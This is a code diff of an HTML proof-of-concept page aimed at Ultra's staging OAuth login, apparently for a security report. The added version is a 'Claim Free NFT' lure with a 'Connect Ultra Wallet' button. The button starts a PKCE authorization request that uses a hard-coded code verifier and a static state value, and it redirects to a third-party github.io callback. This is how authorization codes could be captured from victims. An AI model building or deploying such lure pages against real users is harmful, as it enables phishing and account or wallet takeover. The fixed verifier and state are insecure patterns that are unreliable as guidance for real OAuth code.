@@ -1,39 +1,35 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Ultra OAuth PoC</title>
-  <script>
-    async function generateCodeChallenge(codeVerifier) {
-      const encoder = new TextEncoder();
-      const data = encoder.encode(codeVerifier);
-      const digest = await crypto.subtle.digest("SHA-256", data);
-      return btoa(String.fromCharCode(...new Uint8Array(digest)))
-        .replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
-    }
-
-    (async () => {
-      const codeVerifier = [...crypto.getRandomValues(new Uint8Array(32))]
-        .map(b => b.toString(16).padStart(2, '0')).join('');
-      const codeChallenge = await generateCodeChallenge(codeVerifier);
-
-      localStorage.setItem("code_verifier", codeVerifier);
-
-      const params = new URLSearchParams({
-        response_type: "code",
-        client_id: "2f6ca3c9-87ec-4042-a464-21349485a16f",
-        redirect_uri: "https://nathanogaga118.github.io/ultra-poc/callback.html",
-        scope: "openid",
-        code_challenge: codeChallenge,
-        code_challenge_method: "S256",
-        state: "secureState456",
-        nonce: "random123"
-      });
-
-      window.location.href = `https://auth.staging.ultra.io/auth/realms/ultraio/protocol/openid-connect/auth?${params.toString()}`;
-    })();
-  </script>
+  <title>Ultra Wallet PoC</title>
 </head>
 <body>
-  <h1>Redirecting to Ultra login...</h1>
+  <h1>🎁 Claim Free NFT</h1>
+  <button id="connect">Connect Ultra Wallet</button>
+
+  <script>
+    async function sha256(base64String) {
+      const encoder = new TextEncoder();
+      const data = encoder.encode(base64String);
+      const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+      const hashArray = Array.from(new Uint8Array(hashBuffer));
+      return btoa(String.fromCharCode(...hashArray))
+        .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+    }
+
+    document.getElementById('connect').onclick = async () => {
+      const codeVerifier = '47DEQpj8HBSa-_TImW-5JCeuQeRkm5NMpJWZG3hSuFU';
+      const codeChallenge = await sha256(codeVerifier);
+      const state = 'secureState456';
+      const nonce = 'random123';
+      const clientId = '2f6ca3c9-87ec-4042-a464-21349485a16f';
+      const redirectUri = 'https://nathanogaga118.github.io/ultra-poc/callback.html';
+
+      const authURL = `https://auth.staging.ultra.io/auth/realms/ultraio/protocol/openid-connect/auth?response_type=code&client_id=${clientId}&state=${state}&redirect_uri=${encodeURIComponent(redirectUri)}&scope=openid&code_challenge=${codeChallenge}&code_challenge_method=S256&nonce=${nonce}`;
+
+      sessionStorage.setItem('code_verifier', codeVerifier);
+      window.location = authURL;
+    };
+  </script>
 </body>
 </html>
